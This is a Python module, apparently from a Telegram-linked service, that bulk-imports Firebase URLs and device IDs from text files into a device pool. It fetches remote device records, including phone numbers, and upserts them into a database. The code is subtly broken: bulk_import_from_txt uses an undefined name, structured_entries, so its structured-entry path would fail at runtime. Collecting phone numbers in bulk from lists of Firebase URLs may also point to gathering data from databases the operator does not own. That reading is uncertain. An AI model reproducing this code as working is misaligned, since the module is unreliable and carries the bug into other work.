import asyncio
import re
from collections.abc import Awaitable, Callable
from urllib.parse import urlparse

from sqlalchemy.orm import Session

from app.database import Device
from app.firebase_client import fetch_firebase_devices, get_firebase_workers, normalize_firebase_url
from app.firebase_pool import extract_firebase_urls, upsert_pool_urls
from app.services import normalize_phone, register_device

URL_PATTERN = re.compile(r"^https?://", re.IGNORECASE)


def parse_txt_line(line: str, line_no: int) -> dict | None:
    cleaned = line.strip()
    if not cleaned or cleaned.startswith("#"):
        return None

    device_id = None
    firebase_url = None

    if "|" in cleaned:
        parts = [part.strip() for part in cleaned.split("|", 1)]
        device_id, firebase_url = parts[0], parts[1] if len(parts) > 1 else None
    elif "," in cleaned and URL_PATTERN.match(cleaned.split(",", 1)[-1].strip()):
        parts = [part.strip() for part in cleaned.split(",", 1)]
        device_id, firebase_url = parts[0], parts[1]
    elif URL_PATTERN.match(cleaned):
        firebase_url = cleaned
        parsed = urlparse(normalize_firebase_url(cleaned))
        slug = parsed.path.strip("/").split("/")[-1] if parsed.path.strip("/") else parsed.netloc.split(".")[0]
        device_id = slug or f"fb-{line_no}"
    else:
        device_id = cleaned

    if not device_id:
        return None

    return {
        "device_id": device_id[:128],
        "firebase_url": normalize_firebase_url(firebase_url) if firebase_url else None,
    }


def parse_txt_content(content: str) -> list[dict]:
    entries: list[dict] = []
    for line_no, line in enumerate(content.splitlines(), start=1):
        entry = parse_txt_line(line, line_no)
        if entry:
            entries.append(entry)
    return entries


def upsert_pool_device(
    db: Session,
    device_id: str,
    firebase_url: str | None = None,
    firebase_key: str | None = None,
    phone_number: str | None = None,
) -> Device:
    device = db.query(Device).filter(Device.name == device_id).first()
    if not device and firebase_key:
        device = db.query(Device).filter(Device.firebase_key == firebase_key).first()

    if device:
        if firebase_url:
            device.firebase_source_url = firebase_url
        if firebase_key:
            device.firebase_key = firebase_key
        if phone_number:
            device.phone_number = normalize_phone(phone_number)
        device.is_active = True
        return device

    device = register_device(db, device_id)
    device.firebase_key = firebase_key or device_id
    device.firebase_source_url = firebase_url
    if phone_number:
        device.phone_number = normalize_phone(phone_number)
    device.owner_telegram_id = None
    return device


async def _import_firebase_url(
    db: Session,
    entry: dict,
    semaphore: asyncio.Semaphore,
) -> tuple[int, int]:
    async with semaphore:
        try:
            remote_devices = await fetch_firebase_devices(entry["firebase_url"])
        except Exception:
            upsert_pool_device(
                db,
                device_id=entry["device_id"],
                firebase_url=entry["firebase_url"],
                firebase_key=entry["device_id"],
            )
            return 1, 0

        if not remote_devices:
            upsert_pool_device(
                db,
                device_id=entry["device_id"],
                firebase_url=entry["firebase_url"],
                firebase_key=entry["device_id"],
            )
            return 1, 0

        for remote in remote_devices:
            firebase_key = str(remote.get("firebase_key") or "")
            leaf = firebase_key.split("/")[-1] if firebase_key else ""
            name = (leaf or str(remote.get("name") or entry["device_id"]))[:128]
            if entry["device_id"] and len(remote_devices) == 1:
                name = entry["device_id"][:128]
            upsert_pool_device(
                db,
                device_id=name,
                firebase_url=entry["firebase_url"],
                firebase_key=firebase_key or name,
                phone_number=remote.get("phone_number"),
            )
        return len(remote_devices), 0


async def bulk_import_pool_urls(
    db: Session,
    content: str,
    on_progress: Callable[[int, int, int], Awaitable[None]] | None = None,
) -> dict:
    from app.firebase_pool import get_pool_urls

    urls = extract_firebase_urls(content)
    if not urls:
        raise ValueError("Txt file mein Firebase URL nahi mili")

    imported = 0
    batch_size = 200
    for start in range(0, len(urls), batch_size):
        batch = urls[start : start + batch_size]
        imported += upsert_pool_urls(db, batch)
        if on_progress:
            await on_progress(min(start + batch_size, len(urls)), len(urls), imported)

    total_pool = len(get_pool_urls(db))
    return {
        "lines": len(urls),
        "imported": imported,
        "failed": 0,
        "pool_total": total_pool,
        "pool_urls": total_pool,
    }


async def bulk_import_from_txt(
    db: Session,
    content: str,
    live_fetch: bool = True,
    on_progress: Callable[[int, int, int], Awaitable[None]] | None = None,
) -> dict:
    pool_urls = extract_firebase_urls(content)
    if len(pool_urls) >= 3:
        return await bulk_import_pool_urls(db, content, on_progress=on_progress)

    entries = structured_entries
    if not entries:
        raise ValueError("Txt file khali hai ya format galat hai")

    imported = 0
    failed = 0
    workers = get_firebase_workers()
    semaphore = asyncio.Semaphore(workers)
    batch_size = workers

    async def process_entry(entry: dict) -> int:
        if entry["firebase_url"] and live_fetch:
            added, _ = await _import_firebase_url(db, entry, semaphore)
            return added
        upsert_pool_device(
            db,
            device_id=entry["device_id"],
            firebase_url=entry["firebase_url"],
            firebase_key=entry["device_id"],
        )
        return 1

    for start in range(0, len(entries), batch_size):
        batch = entries[start : start + batch_size]
        results = await asyncio.gather(*(process_entry(entry) for entry in batch), return_exceptions=True)
        for result in results:
            if isinstance(result, Exception):
                failed += 1
            else:
                imported += int(result)
        db.commit()
        if on_progress:
            await on_progress(min(start + batch_size, len(entries)), len(entries), imported)

    db.commit()
    total_pool = db.query(Device).count()
    return {
        "lines": len(entries),
        "imported": imported,
        "failed": failed,
        "pool_total": total_pool,
    }
